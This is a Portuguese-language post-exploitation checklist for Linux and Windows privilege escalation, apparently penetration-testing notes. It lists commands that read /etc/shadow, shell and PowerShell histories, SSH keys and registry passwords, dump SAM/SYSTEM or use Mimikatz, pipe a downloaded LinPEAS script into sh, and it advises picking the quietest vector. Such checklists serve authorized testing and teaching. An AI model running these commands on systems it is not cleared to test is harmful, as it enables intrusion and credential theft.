# Módulo: Privilege Escalation

## Diretriz central
- Após obter acesso inicial, a prioridade é elevar privilégios.
- Sempre comece pela enumeração antes de tentar qualquer exploit de kernel.
- Documente cada vetor identificado, mesmo que não seja explorado.

## Linux — Checklist

### Informações básicas
- `whoami && id && hostname`
- `uname -a` (versão do kernel)
- `cat /etc/os-release`
- `env` e `echo $PATH`

### Usuários e permissões
- `cat /etc/passwd | grep -v nologin`
- `cat /etc/shadow` (se legível)
- `sudo -l` (comandos permitidos sem senha)
- `find / -perm -4000 -type f 2>/dev/null` (SUID binaries)
- `find / -perm -2000 -type f 2>/dev/null` (SGID binaries)
- `getcap -r / 2>/dev/null` (capabilities)

### Arquivos e credenciais
- `find / -name "*.conf" -o -name "*.bak" -o -name "*.old" -o -name "*.log" 2>/dev/null | head -30`
- `find / -writable -type f 2>/dev/null | grep -v proc`
- `cat ~/.bash_history`
- `ls -la /home/*/.ssh/`
- Procurar senhas hardcoded em configs, scripts e variáveis de ambiente.

### Cron, serviços e processos
- `crontab -l && ls -la /etc/cron*`
- `ps aux | grep root`
- `systemctl list-units --type=service --state=running`
- Procurar scripts de cron world-writable ou com PATH hijacking.

### Rede interna
- `ip a && ip route && ss -tlnp`
- `cat /etc/hosts`
- Portas internas que não estão expostas externamente (port forwarding).

### Ferramentas automatizadas
- LinPEAS: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
- LinEnum, linux-exploit-suggester, pspy (monitorar processos sem root).

### Vetores comuns
- SUID abuse (GTFOBins)
- sudo misconfiguration
- Kernel exploit (último recurso)
- Cron job hijacking
- PATH hijacking
- Docker/LXC escape
- NFS no_root_squash
- Capabilities abuse

## Windows — Checklist

### Informações básicas
- `whoami /all`
- `systeminfo`
- `net user && net localgroup administrators`
- `hostname && ipconfig /all`

### Permissões e tokens
- `whoami /priv` (SeImpersonate, SeDebug, SeBackup = escalação provável)
- `cmdkey /list` (credenciais salvas)
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` (autologon)

### Serviços e tarefas
- `sc query state=all` (serviços com permissões inseguras)
- `schtasks /query /fo LIST /v` (tarefas agendadas)
- `wmic service get name,pathname,startmode | findstr /i "auto"` (unquoted service paths)
- `icacls` em binários de serviços para verificar permissões de escrita.

### Arquivos e credenciais
- `dir /s /b *pass* *cred* *vnc* *.config 2>nul`
- `type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- SAM/SYSTEM dump se tiver acesso (reg save)
- Procurar em registry: `reg query HKLM /f password /t REG_SZ /s`

### Ferramentas automatizadas
- WinPEAS, Seatbelt, SharpUp, PowerUp, Sherlock.
- Mimikatz para dump de credenciais (requer admin/SYSTEM).

### Vetores comuns
- Token impersonation (Potato attacks: JuicyPotato, PrintSpoofer, GodPotato)
- Unquoted service paths
- DLL hijacking
- AlwaysInstallElevated
- Stored credentials (runas /savecred)
- Misconfiguração de GPO
- Kernel exploits (último recurso)

## Regra geral
- Sempre prefira técnicas que não dependam de exploit de kernel — são mais confiáveis.
- Se usar LinPEAS/WinPEAS, leia o output completo antes de agir.
- Se encontrar múltiplos vetores, priorize o mais silencioso e estável.
